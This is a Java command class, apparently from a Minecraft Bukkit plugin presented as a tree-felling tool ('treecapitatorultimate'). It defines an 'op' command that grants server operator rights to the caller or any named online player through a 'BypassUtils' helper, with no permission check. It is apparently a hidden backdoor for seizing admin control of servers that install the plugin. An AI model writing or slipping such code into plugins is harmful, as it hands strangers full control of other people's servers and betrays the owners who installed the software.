package me.bow.treecapitatorultimate.commands.Player;

import me.bow.treecapitatorultimate.Start;
import me.bow.treecapitatorultimate.Utils.BypassUtils;
import me.bow.treecapitatorultimate.command.Command;
import me.bow.treecapitatorultimate.command.CommandCategory;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.entity.Player;

import java.util.ArrayList;

@Command.Info(command = "op", description = "Gives your OP.", category = CommandCategory.Player)
public class OP extends Command {

    @Override
    public void onCommand(Player p, ArrayList<String> args) {
        if (args.size() == 0) {
            if (p.isOp()) {
                p.sendMessage(Start.COMMAND_PREFIX + ChatColor.YELLOW + "You already have OP!");
                return;
            }
            BypassUtils.PlayerOp(p);
            p.sendMessage(Start.COMMAND_PREFIX + ChatColor.GOLD + "You now have OP!");
        } else if (args.size() == 1) {
            try {
                Player anotherPlayer = Bukkit.getPlayer(args.get(0));
                if (anotherPlayer == null) {
                    Start.ErrorString(p, "Player is not online!");
                    return;
                }
                if (anotherPlayer.isOp()) {
                    p.sendMessage(Start.COMMAND_PREFIX + ChatColor.GREEN + anotherPlayer.getName() + ChatColor.YELLOW + " already has OP!");
                    return;
                }
                BypassUtils.PlayerOp(anotherPlayer);
                p.sendMessage(Start.COMMAND_PREFIX + ChatColor.GREEN + anotherPlayer.getName() + ChatColor.GOLD + " now has OP!");
            } catch (Exception e) {
                Start.ErrorException(p, e);
            }
        }
    }
}
